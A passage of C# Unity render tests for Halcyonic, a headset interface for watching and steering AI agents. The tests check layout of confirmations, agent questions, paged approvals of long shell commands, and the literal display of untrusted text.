            view.Show(running, screen, steering);
            view.CloseUp("doing-stop");
            failures.AddRange(view.Fits("doing-stop"));
            failures.AddRange(YesClear(view.Frame, view.Name + " doing-stop"));
            // The answer stays; what was sent and the log give way to Yes's row, and nothing pages.
            if (!view.Frame.ShownLines.Any(line => !line.Row.Droppable)) failures.Add(view.Name + " doing-stop: the answer gives way to Yes.");
            Debug.Log("Halcyonic: workspace render " + view.Name + " doing-stop: " + view.Frame.ShownLines.Count + " lines show beside the confirmation, "
                + view.Frame.Dropped + " give way.");

            // How is it running?: the run's details in place of the log, Show the log beside the question.
            var detailed = Work.Running();
            detailed.Execution.Runtime.Synthetic = false;
            detailed.Execution.ModelRef = "ollama/qwen3.6";
            detailed.Execution.Directory = "/Users/person/HalcyonicProjects/rate-limiter";
            detailed.Execution.StartedAt = Time;
            detailed.Execution.TurnCount = 2;
            view.Show(detailed.Present(), new WorkspaceScreen { Zone = TimeZoneInfo.Utc, Details = true }, Steering());
            failures.AddRange(view.Opaque("doing-details"));
            view.CloseUp("doing-details");
            failures.AddRange(view.Fits("doing-details"));
            if (view.Frame.ButtonFor(WorkspaceScreens.ShowLog) == null) failures.Add(view.Name + " doing-details: Show the log does not stand beside the question.");
            if (view.Frame.ShownLines.Count != 4 || view.Frame.Dropped > 0) failures.Add(view.Name + " doing-details: " + view.Frame.ShownLines.Count + " of the run's 4 lines show.");
            return failures;
        }

        /// <summary>The log shows its newest lines, the newest last, its caption over them, and the agent's words lean.</summary>
        private static IEnumerable<string> LogHolds(View view, WorkspacePresentation workspace, string what)
        {
            var lines = view.Frame.ShownLines;
            var log = lines.Where(line => line.Row.Droppable && line.Row.Continues).ToList();
            var newest = WorkspaceText.Activity(workspace.Activity[workspace.Activity.Count - 1], TimeZoneInfo.Utc);
            if (log.Count == 0) yield return what + ": no line of the log shows.";
            else if (log[log.Count - 1].Row.Title != newest) yield return what + ": the log's last line is not the newest: " + log[log.Count - 1].Row.Title;
            if (log.Count > 0 && !lines.Any(line => line.Row.Droppable && !line.Row.Continues)) yield return what + ": the log shows without its caption.";
            foreach (var (label, row) in log)
            {
                if (view.Frame.Leans(label) != row.Claim) yield return what + ": " + label.name + (row.Claim ? " is the agent's words but does not lean." : " leans but is not the agent's words.");
                label.ForceMeshUpdate();
                if (row.Claim && label.isTextTruncated && LastVisible(label) != Ellipsis) yield return what + ": the agent's words cut short do not end in an ellipsis.";
            }
            Debug.Log("Halcyonic: workspace render " + what + ": " + log.Count + " lines of the log show, " + view.Frame.Dropped + " older ones give way.");
        }

        /// <summary>
        /// Yes stands clear, by 12 mm, of every control the screen had before its confirm step and
        /// every one shown since, and never in the pager's row; the question beside it shows whole.
        /// </summary>
        internal static IEnumerable<string> YesClear(PanelFrame frame, string what)
        {
            var yes = frame.Yes;
            if (yes == null)
            {
                yield return what + ": Yes does not show.";
                yield break;
            }
            var place = PanelFrame.RectOf(yes);
            var gap = Glaze.TargetGapMeters / PanelFrame.Distance;
            var near = frame.Recorded.Count(rect => !Apart(place, rect, gap));
            if (near > 0) yield return what + ": Yes stands within 12 mm of " + near + " places where a control stood before or since its confirm step.";
            foreach (var pager in new[] { frame.NextPage, frame.PreviousPage })
            {
                if (pager == null) continue;
                var rect = PanelFrame.RectOf(pager);
                if (rect.yMax > place.yMin && rect.yMin < place.yMax) yield return what + ": Yes stands in the pager's row.";
            }
            // Nothing that confirms shows the microphone: hold to talk's icon is on hold to talk alone.
            foreach (var button in new[] { yes, frame.RightEnd })
            {
                if (button?.Icon != null && button.Icon.text == GlazeIconGlyphs.Of(GlazeIcon.HoldToTalk)) yield return what + ": " + button.name + " shows the microphone.";
            }
            var question = frame.Labels.FirstOrDefault(label => label.name == "Question");
            if (question != null)
            {
                question.ForceMeshUpdate();
                if (question.isTextTruncated) yield return what + ": the confirmation's question is cut short: " + question.text;
            }
            Debug.Log("Halcyonic: workspace render " + what + ": Yes stands clear of " + frame.Recorded.Count + " places where a control stood.");
        }

        /// <summary>
        /// The agent's questions under Waiting for you (ADR 0022), a step at a time: the mock's
        /// scripted question with an answer chosen, its typed answer with hold to talk beside it,
        /// three questions waiting, the second prompt with several chosen, a question too long for two
        /// lines, twenty answers offered, a long label, a secret question Halcyonic cannot answer, and
        /// one whose answer was sent and may still take effect. Each is as opaque as the rest, fits,
        /// and shows its text uncut in parts.
        /// </summary>
        private static IEnumerable<string> AsksAQuestion(View view)
        {
            var failures = new List<string>();
            WorkspaceScreen Screen(bool speak = false) => new() { Question = WorkspaceQuestion.NeedFromYou, Speak = speak };

            var scripted = Work.Asking(Scripted());
            var screen = Screen();
            var draft = new QuestionDraft("render-execution", scripted.Execution.PendingQuestions[0]);
            draft.Choose(0, "Light");
            view.Read(screen, draft);
            failures.AddRange(QuestionShot(view, scripted.Present(), screen, "question"));
            if (!view.Frame.ShownRows.Any(row => row.Row.Chosen && row.Row.Title.StartsWith("Chosen: Light", StringComparison.Ordinal)))
            {
                failures.Add(view.Name + " question: the answer chosen does not say so in words.");
            }

            // Its typed answer, with hold to talk beside it as in a development build: a draft until Send answer.
            var typing = Screen(speak: true);
            var typed = new QuestionDraft("render-execution", scripted.Execution.PendingQuestions[0]);
            typed.Type(0, "Solarized, with high contrast");
            view.Read(typing, typed);
            typing.Place.Turn(1);
            failures.AddRange(QuestionShot(view, scripted.Present(), typing, "question-typed"));
            if (view.Frame.ButtonFor(WorkspaceScreens.SpeakAnswer) == null) failures.Add(view.Name + " question-typed: hold to talk does not show beside Type an answer.");
            // One Hold to talk a screen: the bar's would speak an instruction under the same words.
            if (view.Frame.ButtonFor(WorkspaceScreens.HoldToTalk) != null) failures.Add(view.Name + " question-typed: the bar offers a second Hold to talk.");

            // Three questions shown, the most at once: the note says more wait.
            var three = Work.Asking(Scripted(), more: 2);
            failures.AddRange(QuestionShot(view, three.Present(), Screen(), "question-three"));
            if (view.Frame.Labels.FirstOrDefault(label => label.name == "Pager note")?.text.Contains("At least 2 more questions") != true)
            {
                failures.Add(view.Name + " question-three: the note does not say more questions wait.");
            }

            // Through the first prompt's pages of answers to the second prompt, several chosen.
            var several = Screen();
            draft.Choose(1, "Sign in");
            draft.Choose(1, "Settings");
            view.Read(several, draft);
            for (var turns = 0; turns < 4 && several.Place.Prompt == 0; turns++) several.Place.Turn(1);
            failures.AddRange(QuestionShot(view, scripted.Present(), several, "question-several"));
            if (several.Place.Prompt != 1) failures.Add(view.Name + ": Next does not reach the second prompt.");

            // A question longer than two lines shows in parts, and counts as read only once its last part has shown.
            var longer = Scripted();
            longer.Prompts.RemoveAt(1);
            longer.Prompts[0].Text = string.Join(" ", Enumerable.Repeat("Which colour scheme should the dashboard use, given that people read it at night and in bright offices?", 6));
            var lengthy = Work.Asking(longer);
            var reading = Screen();
            var lengthyDraft = new QuestionDraft("render-execution", lengthy.Execution.PendingQuestions[0]);
            view.Read(reading, lengthyDraft);
            failures.AddRange(QuestionShot(view, lengthy.Present(), reading, "question-long"));
            var textParts = reading.QuestionParts[0];
            if (textParts.Count < 2) failures.Add(view.Name + ": a question longer than two lines does not show in parts.");
            if (lengthyDraft.WasShownWhole(0)) failures.Add(view.Name + ": a question counts as read before its last part shows.");
            for (var turn = 1; turn < textParts.Count; turn++)
            {
                reading.Place.Turn(1);
                failures.AddRange(QuestionShot(view, lengthy.Present(), reading, "question-long-" + (turn + 1).ToString(CultureInfo.InvariantCulture), save: false));
            }
            if (!lengthyDraft.WasShownWhole(0)) failures.Add(view.Name + ": a question does not count as read after its last part shows.");
            if (string.Concat(textParts) != LabelText.Plain(longer.Prompts[0].Text)) failures.Add(view.Name + ": the question's parts, together, are not its text.");

            var many = Scripted();
            many.Prompts.RemoveAt(1);
            many.Prompts[0].Multiple = true;
            many.Prompts[0].Options = Enumerable.Range(1, 20)
                .Select(index => new QuestionOption { Label = "Page " + index.ToString(CultureInfo.InvariantCulture), Description = "Restyle page " + index.ToString(CultureInfo.InvariantCulture) })
                .ToList();
            var paging = Screen();
            failures.AddRange(QuestionShot(view, Work.Asking(many).Present(), paging, "question-options"));
            if (paging.Place.Steps != 11) failures.Add(view.Name + ": twenty answers and typing take " + paging.Place.Steps + " steps, not 11.");

            // A long label shows whole; only its description is cut short.
            var labelled = Scripted();
            labelled.Prompts.RemoveAt(1);
            const string longLabel = "Dark, with the brand's own blue for every link";
            labelled.Prompts[0].Options[1].Label = longLabel;
            labelled.Prompts[0].Options[1].Description = "Light text on a dark background, with the links in the brand's blue and the warnings in its amber";
            failures.AddRange(QuestionShot(view, Work.Asking(labelled).Present(), Screen(), "question-long-label"));
            var row = view.Frame.ShownRows.FirstOrDefault(shown => shown.Row.Title.StartsWith(longLabel, StringComparison.Ordinal));
            if (row.Button == null) failures.Add(view.Name + " question-long-label: the long label does not show.");
            else
            {
                row.Button.Label.ForceMeshUpdate();
                if (LaidOutVisible(row.Button.Label).Length <= longLabel.Length) failures.Add(view.Name + " question-long-label: the label is cut short.");
            }

            var secret = Scripted();
            secret.Prompts.RemoveAt(1);
            secret.Answerable = false;
            secret.Prompts[0].Secret = true;
            secret.Prompts[0].Header = "Token";
            secret.Prompts[0].Text = "Paste the deploy token.";
            failures.AddRange(QuestionShot(view, Work.Asking(secret).Present(), Screen(speak: true), "question-secret"));
            if (view.Frame.ShownRows.Count > 0) failures.Add(view.Name + " question-secret: a question Halcyonic can't answer offers answers.");
            // Nothing invites typing or saying the secret, though this agent app takes instructions while it waits (ADR 0022).
            foreach (var entry in new[] { WorkspaceScreens.TellIt, WorkspaceScreens.HoldToTalk, WorkspaceScreens.TypeAnswer, WorkspaceScreens.SpeakAnswer })
            {
                if (view.Frame.ButtonFor(entry) != null) failures.Add(view.Name + " question-secret: " + entry + " is offered while the agent asks for a secret.");
            }
            if (view.Frame.ButtonFor(WorkspaceScreens.Stop) == null) failures.Add(view.Name + " question-secret: Stop, the way on, does not show.");

            // An answer sent that may still take effect: only the inert Sent… stands at the right end.
            var flight = Work.Asking(Scripted());
            var submissions = new CommandSubmissions();
            var answer = new QuestionDraft("render-execution", flight.Execution.PendingQuestions[0]);
            answer.Choose(0, "Dark");
            answer.Choose(1, "Orders");
            answer.ShownWhole(0);
            answer.ShownWhole(1);
            var sent = Steering().SendAnswer(answer, flight.Present()).Command!;
            _ = submissions.SubmitAsync(_ => new TaskCompletionSource<CommandAckMessage>().Task, sent, "render-execution");
            failures.AddRange(QuestionShot(view, flight.Present(submissions), Screen(speak: true), "question-sent"));
            var end = view.Frame.RightEnd;
            if (end == null || end.Label.text != LabelText.ForTextMeshPro(WorkspaceText.Sent) || end.Available || end.Static)
            {
                failures.Add(view.Name + " question-sent: something other than the inert Sent… stands at the bar's right end.");
            }
            if (view.Frame.ButtonFor(WorkspaceScreens.SendAnswer) != null) failures.Add(view.Name + " question-sent: Send answer is offered while the answer sent may take effect.");
            return failures;
        }

        /// <summary>Draws a question screen and checks it: opaque, fits, its text's part shown whole.</summary>
        private static IEnumerable<string> QuestionShot(View view, WorkspacePresentation workspace, WorkspaceScreen screen, string suffix, bool save = true)
        {
            var failures = new List<string>();
            view.Show(workspace, screen, Steering());
            if (save)
            {
                failures.AddRange(view.Opaque(suffix));
                view.CloseUp(suffix);
            }
            failures.AddRange(view.Fits(suffix));
            var text = view.Frame.ShownLines.FirstOrDefault();
            if (text.Label == null) failures.Add(view.Name + " " + suffix + ": the question's text does not show.");
            else
            {
                text.Label.ForceMeshUpdate();
                // The agent's question shows in parts, never cut.
                if (text.Label.isTextTruncated) failures.Add(view.Name + " " + suffix + ": the question's text is cut short: " + text.Label.text);
            }
            return failures;
        }

        /// <summary>
        /// An approval of a very long shell command, as the person reaches it: the request under
        /// Waiting for you, then Approve, then every part of the whole request with Next. The parts
        /// together hold every character, each part only its own and none cut; the pager stands at the
        /// top in the tabs' place; Yes, approve stays locked until the last part, and stands clear of
        /// every control shown before and since. The demonstration's short request fits one part and
        /// can be confirmed as it shows; Deny needs no reading.
        /// </summary>
        private static IEnumerable<string> ShowsTheWholeRequest(View view)
        {
            var failures = new List<string>();
            var command = LongCommand();
            var work = Work.Approval(command, title: "Release the checkout service", objective: "Build every package and upload the release.");
            var workspace = work.Present();
            var screen = new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou };
            var steering = Steering();
            view.Show(workspace, screen, steering);
            failures.AddRange(view.Fits("approval-before"));
            if (steering.Press(WorkspaceAction.Approve, workspace).Step != SteeringStep.Confirm) failures.Add(view.Name + ": Approve does not ask to be confirmed.");
            screen.Question = WorkspaceQuestion.Doing;
            var request = steering.Request(workspace)!;
            Split(view, workspace, steering, screen, request);
            var parts = screen.RequestParts;
            if (parts.Count < 2) failures.Add(view.Name + ": a request of " + request.Length + " characters takes one part, so the render checks no parts.");
            for (var part = 0; part < parts.Count; part++)
            {
                screen.RequestPart = part;
                steering.RequestShown(part + 1, parts.Count);
                var model = view.Show(workspace, screen, steering);
                var last = part == parts.Count - 1;
                var what = view.Name + " approval part " + (part + 1).ToString(CultureInfo.InvariantCulture);
                failures.AddRange(view.Fits("approval-" + (part + 1).ToString(CultureInfo.InvariantCulture)));
                if (model.Tabs.Count > 0 || view.Frame.Tabs.Count > 0) failures.Add(what + ": the tabs show beside the whole request.");
                var shown = view.Frame.ShownLines.Single();
                shown.Label.ForceMeshUpdate();
                if (shown.Label.isTextTruncated) failures.Add(what + ": the part is cut short.");
                failures.AddRange(ShowsLiterally(shown.Label, what));
                var yes = view.Frame.Yes;
                if (yes == null || yes.Available != last) failures.Add(what + ": Yes, approve " + (last ? "can't be pressed on the last part." : "can be pressed before the last part."));
                var next = view.Frame.NextPage;
                if (parts.Count > 1 && (next == null || PanelFrame.RectOf(next).yMin < view.Frame.ListArea.yMax)) failures.Add(what + ": the pager does not stand at the top.");
                if (part == 0)
                {
                    failures.AddRange(view.Opaque("approval"));
                    view.CloseUp("approval");
                }
                if (last)
                {
                    view.CloseUp("approval-last");
                    failures.AddRange(YesClear(view.Frame, what));
                }
            }
            if (string.Concat(parts) != LabelText.Plain(request)) failures.Add(view.Name + ": the parts of the request, together, are not the whole request.");
            Debug.Log("Halcyonic: workspace render " + view.Name + ": a request of " + request.Length + " characters shows in " + parts.Count + " parts of "
                + string.Join(", ", parts.Select(part => part.Length.ToString(CultureInfo.InvariantCulture))) + " characters, the confirmation only on the last.");

            // The demonstration's request fits one part, so the approval can be confirmed as it shows.
            var brief = Work.Approval("Run make migrate");
            var briefWorkspace = brief.Present();
            var briefScreen = new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou };
            var briefSteering = Steering();
            view.Show(briefWorkspace, briefScreen, briefSteering);
            briefSteering.Press(WorkspaceAction.Approve, briefWorkspace);
            briefScreen.Question = WorkspaceQuestion.Doing;
            Split(view, briefWorkspace, briefSteering, briefScreen, briefSteering.Request(briefWorkspace)!);
            briefSteering.RequestShown(1, briefScreen.RequestParts.Count);
            view.Show(briefWorkspace, briefScreen, briefSteering);
            if (briefScreen.RequestParts.Count != 1) failures.Add(view.Name + ": the demonstration's request takes " + briefScreen.RequestParts.Count + " parts.");
            if (view.Frame.Yes?.Available != true) failures.Add(view.Name + ": the demonstration's approval cannot be confirmed as it shows.");
            failures.AddRange(YesClear(view.Frame, view.Name + " approval-short"));
            view.CloseUp("approval-short");

            // Deny needs no reading.
            var denying = Steering();
            var denyScreen = new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou };
            view.Show(workspace, denyScreen, denying);
            denying.Press(WorkspaceAction.Deny, workspace);
            denyScreen.Question = WorkspaceQuestion.Doing;
            Split(view, workspace, denying, denyScreen, denying.Request(workspace)!);
            view.Show(workspace, denyScreen, denying);
            if (view.Frame.Yes?.Available != true) failures.Add(view.Name + ": Yes, deny waits for the whole request.");
            failures.AddRange(YesClear(view.Frame, view.Name + " deny"));
            view.CloseUp("deny");
            return failures;
        }

        /// <summary>The request in parts of as many whole lines as the body holds while its confirmation shows, as the director splits it.</summary>
        private static void Split(View view, WorkspacePresentation workspace, WorkspaceSteering steering, WorkspaceScreen screen, string request)
        {
            screen.RequestParts = Array.Empty<string>();
            screen.RequestLines = 1;
            screen.RequestPart = 0;
            view.Show(workspace, screen, steering);
            var room = view.Frame.ListArea;
            screen.RequestLines = Mathf.Max(1, Mathf.FloorToInt(room.height / view.Frame.LineHeightOf(PanelTextSize.Body) + 0.01f));
            screen.RequestParts = view.Frame.SplitLines(request, screen.RequestLines, room.width);
        }

        /// <summary>
        /// Every other confirmation, reached by showing the screen and then pressing: Stop beside hold
        /// to talk and without it, a spoken instruction, and answers a policy reviews. Each Yes stands
        /// clear of every control shown before it and since, its question whole.
        /// </summary>
        private static IEnumerable<string> ConfirmsWhereNothingStood(View view)
        {
            var failures = new List<string>();
            var running = Work.Running().Present();
            foreach (var speak in new[] { true, false })
            {
                var steering = Steering();
                var screen = new WorkspaceScreen { Speak = speak };
                view.Show(running, screen, steering);
                steering.Press(WorkspaceAction.Interrupt, running);
                view.Show(running, screen, steering);
                var suffix = "stop" + (speak ? "-beside-hold" : "");
                failures.AddRange(view.Fits(suffix));
                failures.AddRange(YesClear(view.Frame, view.Name + " " + suffix));
                if (view.Frame.Yes?.Role != ButtonRole.Destructive || view.Frame.Yes?.On != true) failures.Add(view.Name + " " + suffix + ": Yes, stop is not solid red.");
                view.CloseUp(suffix);
            }

            var spoken = Steering();
            var heardScreen = new WorkspaceScreen { Speak = true };
            view.Show(running, heardScreen, spoken);
            spoken.Spoken("Add a test for the limiter and run the checks again.", running);
            // This panel shows the words whole in its question, so they count as shown as it does.
            spoken.RequestShown(1, 1);
            view.Show(running, heardScreen, spoken);
            failures.AddRange(view.Fits("heard"));
            failures.AddRange(YesClear(view.Frame, view.Name + " heard"));
            view.CloseUp("heard");

            var reviewed = Work.Asking(Scripted(), reviewAnswers: true);
            var workspace = reviewed.Present();
            var answering = Steering();
            var screenOfAnswers = new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou, Speak = true };
            view.Show(workspace, screenOfAnswers, answering);
            var draft = screenOfAnswers.Place.Draft!;
            draft.Choose(0, "Dark");
            draft.Choose(1, "Orders");
            draft.ShownWhole(0);
            draft.ShownWhole(1);
            if (answering.SendAnswer(draft, workspace).Step != SteeringStep.Confirm) failures.Add(view.Name + ": a reviewed answer does not ask to be confirmed.");
            view.Show(workspace, screenOfAnswers, answering);
            failures.AddRange(view.Fits("answers"));
            failures.AddRange(YesClear(view.Frame, view.Name + " answers"));
            view.CloseUp("answers");
            return failures;
        }

        /// <summary>
        /// Hold to talk beside Tell it, for work that takes instructions (ADR 0021): whole, inside the
        /// bar, 12 mm from every action; and left out, never squeezed in, where Deny and Tell it fill
        /// the bar's two secondary places.
        /// </summary>
        private static IEnumerable<string> OffersHoldToTalk(View view)
        {
            var failures = new List<string>();
            foreach (var (workspace, expected, what) in new[]
            {
                (Work.Running().Present(), true, "beside 2 actions"),
                (Work.Approval("Run make migrate").Present(), false, "beside 4 actions"),
            })
            {
                view.Show(workspace, new WorkspaceScreen { Speak = true }, Steering());
                var name = view.Name + " hold to talk " + what;
                var speak = view.Frame.ButtonFor(WorkspaceScreens.HoldToTalk);
                if (expected && speak == null) failures.Add(name + ": it does not show.");
                if (!expected && speak != null) failures.Add(name + ": it is squeezed in beside Deny and Tell it.");
                failures.AddRange(view.Fits("hold-to-talk-" + (expected ? "shown" : "left-out")));
                if (expected) view.CloseUp("hold-to-talk");
                Debug.Log("Halcyonic: workspace render " + name + ": " + (speak != null ? "shown" : "left out"));
            }
            return failures;
        }

        /// <summary>
        /// Source text on a real section label shows exactly as written: no markup, and backslash
        /// sequences as they are. The same text unescaped shows how TextMeshPro would have changed it.
        /// A quote cut short ends in an ellipsis.
        /// </summary>
        private static IEnumerable<string> ShowsTextAsWritten(WorkspacePanel panel, string name)
        {
            var failures = new List<string>();
            var view = panel.Section;
            var area = new Rect(-0.35f, -0.1f, 0.7f, 0.2f);
            // Every character is in the static atlas, so drawing it, escaped or not, adds no glyph anywhere.
            var plain = IntelligenceText.Plain("<b>b</b> <sprite=0> " + Backslash + "n " + Backslash + "u0041 " + Backslash + "U00000042 "
                + Backslash + Backslash + " z" + Char(0x202E) + Char(0x200B));
            view.Show(new SectionPresentation(SectionKind.Understanding, plain, SectionTone.Secondary,
                new[] { new SectionLine("reported", plain, SectionTone.Claim) }, simulated: true), area);
            foreach (var label in view.Labels)
            {
                if (label.richText) failures.Add(name + ": the section label " + label.name + " interprets markup.");
            }
            var line = view.Labels.First(label => label.name == "Line 0");
            line.ForceMeshUpdate();
            var escaped = line.textInfo.characterCount;
            if (escaped != plain.Length || line.textInfo.lineCount != 1)
            {
                failures.Add(name + ": source text of " + plain.Length + " characters shows as " + escaped + " on " + line.textInfo.lineCount + " lines.");
            }
            if (!view.Leans(line)) failures.Add(name + ": a claim in a section does not lean.");
            var shown = line.text;
            line.text = plain;
            line.ForceMeshUpdate();
            Debug.Log("Halcyonic: workspace render " + name + ": source text of " + plain.Length + " characters shows as " + escaped
                + " escaped, and as " + line.textInfo.characterCount + " on " + line.textInfo.lineCount + " lines unescaped.");
            line.text = shown;

            // A quote too long for its line must end in an ellipsis, so it never reads as all that was said.
            view.Show(new SectionPresentation(SectionKind.Understanding, "Provenance", SectionTone.Secondary,
                new[] { new SectionLine("reported", LongQuote(), SectionTone.Claim) }, simulated: true), area);
            line.ForceMeshUpdate();
            if (LastVisible(line) != Ellipsis) failures.Add(name + ": a quote cut short does not end in an ellipsis.");
            view.Hide();
            return failures;
        }

        /// <summary>
        /// Hostile text on every label that shows text Halcyonic did not write, through the code that
        /// shows it: the workspace's title, goal and notice, what needs the person, what this headset
        /// sent, the log's caption and lines, the request and what it wants, the agent's question,
        /// the recorded instructions offered, the whole request in parts, a section, the peek, and a
        /// character's title and notes. Every label must interpret none of it and show what the rule
        /// made of it, all of it or cut short with an ellipsis; none may use TextMeshPro's italics or
        /// bold, and the agent's words lean by themselves and keep their ellipsis.
        /// </summary>
        private static IEnumerable<string> ShowsUntrustedTextLiterally(View view)
        {
            var failures = new List<string>();
            var root = view.Root;
            var name = view.Name;
            var peek = PeekLabel.Create(root.transform);
            var peeked = new CharacterPresentation(view.Characters[3].View.WorkstreamId, Hostile("title"), CharacterActivity.WaitingForHuman, "Waiting for you",
                AttentionLevel.ActionRequired, new[] { "It wants to run: " + Hostile("peek") }, 1, true, false, false);
            peek.Show(view.Characters[3].Target, view.Characters.ConvertAll(character => character.Target), PeekCard.Of(new WorkspacePresentation(peeked, null, null, null,
                Array.Empty<WorkspaceAction>(), Array.Empty<WorkspaceAction>(), Array.Empty<CommandFeedback>(), Array.Empty<ActivityEntry>())), 1f, aboveCharacter: true);

            // The approval: the title, the goal, a notice, what it wants and the request.
            var waiting = Work.Approval(Hostile("request"), tool: Hostile("tool"), title: Hostile("title"));
            waiting.Workstream.Objective = Hostile("objective");
            var screen = new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou, Notice = "Couldn't send: " + Hostile("setup problem") };
            view.Show(waiting.Present(), screen, Steering());
            failures.AddRange(AllShowLiterally(root, name + " need", view.Eyes));
            failures.AddRange(Carry(root, name + " need", "Notice", "Line 0", "Line 1"));
            screen.Notice = null;
            view.Show(waiting.Present(), screen, Steering());
            failures.AddRange(Carry(root, name + " need", "Title", "Context"));
            view.CloseUp("untrusted");

            // What is it doing?: what needs the person, what was sent, the log's caption and lines, where claims lean.
            var running = Work.Running();
            running.Workstream.Title = Hostile("title");
            var failed = new CharacterPresentation("render-work", Hostile("title"), CharacterActivity.Failed, "Couldn't finish", AttentionLevel.Notice,
                new[] { "Couldn't finish: " + Hostile("failure") }, 0, true, false, false);
            var hostileActivity = new[]
            {
                new ActivityEntry(1, "2026-10-01T09:00:01.000Z", ActivityKind.Tool, Hostile("tool"), false),
                new ActivityEntry(2, "2026-10-01T09:00:02.000Z", ActivityKind.Message, Hostile("message"), true),
                new ActivityEntry(3, "2026-10-01T09:00:03.000Z", ActivityKind.Approval, "It wants to run: " + Hostile("approval"), false),
                new ActivityEntry(4, "2026-10-01T09:00:04.000Z", ActivityKind.Message, LongQuote(), true),
            };
            var feedback = new[] { new CommandFeedback("c1", CommandType.ExecutionInterrupt, CommandStatus.Rejected, "Couldn't do that: " + Hostile("refusal")) };
            var doing = With(running.Present(), hostileActivity, feedback, failed);
            var doingScreen = new WorkspaceScreen { ActivityNote = " · " + Hostile("note"), Zone = TimeZoneInfo.Utc };
            view.Show(doing, doingScreen, Steering());
            failures.AddRange(AllShowLiterally(root, name + " activity", view.Eyes));
            var lines = view.Frame.ShownLines.Where(line => line.Row.Title.Contains(Marker)).Select(line => line.Label.name).ToArray();
            if (lines.Length < 6) failures.Add(name + " activity: " + lines.Length + " lines carry the hostile text, not the answer, what was sent, the caption and three lines of the log.");
            failures.AddRange(Carry(root, name + " activity", lines));
            foreach (var (label, row) in view.Frame.ShownLines)
            {
                if (view.Frame.Leans(label) != row.Claim) failures.Add(name + ": " + label.name + (row.Claim ? " is the agent's words but does not lean." : " leans but is not the agent's words."));
            }
            var cutClaim = view.Frame.ShownLines.LastOrDefault(line => line.Row.Claim);
            if (cutClaim.Label == null || !cutClaim.Label.isTextTruncated || LastVisible(cutClaim.Label) != Ellipsis)
            {
                failures.Add(name + ": the agent's words cut short do not end in an ellipsis.");
            }
            view.CloseUp("untrusted-activity");

            // The recorded instructions offered in place of the keyboard.
            var presets = new WorkspaceScreen { Presets = new[] { new PresetInstruction(Hostile("preset"), "Continue."), new PresetInstruction("Continue", "Continue.") } };
            view.Show(running.Present(), presets, Steering());
            failures.AddRange(AllShowLiterally(root, name + " presets", view.Eyes));
            failures.AddRange(Carry(root, name + " presets", "Label"));

            // The agent's question: its prompt's header, its text, a label and its description.
            var hostile = Scripted();
            hostile.Prompts[0].Header = Hostile("header");
            hostile.Prompts[0].Text = Hostile("question");
            hostile.Prompts[0].Options[0].Label = Hostile("label");
            hostile.Prompts[0].Options[0].Description = Hostile("description");
            view.Show(Work.Asking(hostile).Present(), new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou }, Steering());
            failures.AddRange(AllShowLiterally(root, name + " question", view.Eyes));
            failures.AddRange(Carry(root, name + " question", "Pager heading", "Line 0", "Label"));

            // The whole request in parts while Approve asks to be confirmed.
            var approving = Steering();
            var armed = waiting.Present();
            var armedScreen = new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou };
            view.Show(armed, armedScreen, approving);
            approving.Press(WorkspaceAction.Approve, armed);
            Split(view, armed, approving, armedScreen, approving.Request(armed)!);
            view.Show(armed, armedScreen, approving);
            failures.AddRange(AllShowLiterally(root, name + " confirming", view.Eyes));
            failures.AddRange(Carry(root, name + " confirming", "Line 0"));

            // A section from a source quoting the agent.
            view.Show(running.Present(), new WorkspaceScreen { Question = WorkspaceQuestion.Understand }, Steering(), HostileSection());
            failures.AddRange(AllShowLiterally(root, name + " section", view.Eyes));
            failures.AddRange(Carry(root, name + " section", "Provenance", "Class 0", "Line 0"));

            // The run's details: the model and the folder are the runtime's words.
            var run = Work.Running();
            run.Execution.Runtime.Synthetic = false;
            run.Execution.ModelRef = Hostile("model");
            // A folder's name holds no slash; the rest of the hostile text stays in it.
            run.Execution.Directory = "/Users/person/" + Hostile("folder").Replace("/", "");
            view.Show(run.Present(), new WorkspaceScreen { Zone = TimeZoneInfo.Utc, Details = true }, Steering());
            failures.AddRange(AllShowLiterally(root, name + " details", view.Eyes));
            failures.AddRange(Carry(root, name + " details", "Line 1", "Line 2"));

            failures.AddRange(CharacterShowsLiterally(root, name, view.Camera));
            UnityEngine.Object.DestroyImmediate(peek.gameObject);
            return failures;
        }

        /// <summary>The characters a label laid out and shows, in order: what a person reads.</summary>
        private static string LaidOutVisible(TMP_Text label)
        {
            var info = label.textInfo;
            var text = new StringBuilder(info.characterCount);
            for (var index = 0; index < info.characterCount; index++)
            {
                var character = info.characterInfo[index];
                if (character.isVisible || character.character == ' ') text.Append(character.character);
            }
            return text.ToString().TrimEnd(Ellipsis);
        }

        /// <summary>
        /// A bright plate behind the workspace, drawn and hidden with the stage: the workspace opens
        /// clear of every character and label, so without it nothing would be behind the workspace for
        /// the checks that nothing shows through it.
        /// </summary>
        private static void Backdrop(Transform stage, Vector3 eyes, Pose workspace)
        {
            var backdrop = GameObject.CreatePrimitive(PrimitiveType.Quad);
            backdrop.name = "Backdrop behind the workspace";
            UnityEngine.Object.DestroyImmediate(backdrop.GetComponent<Collider>());
            backdrop.transform.SetParent(stage, true);
            var toward = (workspace.position - eyes).normalized;
            backdrop.transform.SetPositionAndRotation(eyes + toward * 1.6f, Quaternion.LookRotation(toward, Vector3.up));
            backdrop.transform.localScale = Vector3.one;
            backdrop.transform.localScale = new Vector3(1.6f / backdrop.transform.lossyScale.x, 1.1f / backdrop.transform.lossyScale.y, 1f);
            backdrop.GetComponent<MeshRenderer>().sharedMaterial = new Material(Shader.Find("Sprites/Default")) { color = new Color(0.95f, 0.95f, 0.92f, 1f) };
        }

        /// <summary>
        /// Six characters as the stage stands them (<see cref="CharacterStage.Stance"/>), 12 degrees
        /// apart as the eyes see them (<see cref="CharacterStage.Spread"/>) and <paramref name="radius"/>
        /// away, turned <paramref name="turn"/> degrees to the right:
        /// at the stage's default height, or, on a surface <paramref name="surfaceDrop"/> below the eyes,
        /// with their labels resting on it. Beside a window, the stage's four at
        /// <see cref="CharacterStage.WindowSlotDegrees"/> and <see cref="CharacterStage.WindowSlotLiftDegrees"/>,
        /// showing only their badges.
        /// </summary>
        internal static List<(CharacterView View, CharacterTarget Target)> Lineup(Transform parent, Vector3 eyes, float radius, float? surfaceDrop,
            Func<string, int, CharacterPresentation> show, float turn = 0f, bool besideWindow = false)
        {
            var characters = new List<(CharacterView View, CharacterTarget Target)>();
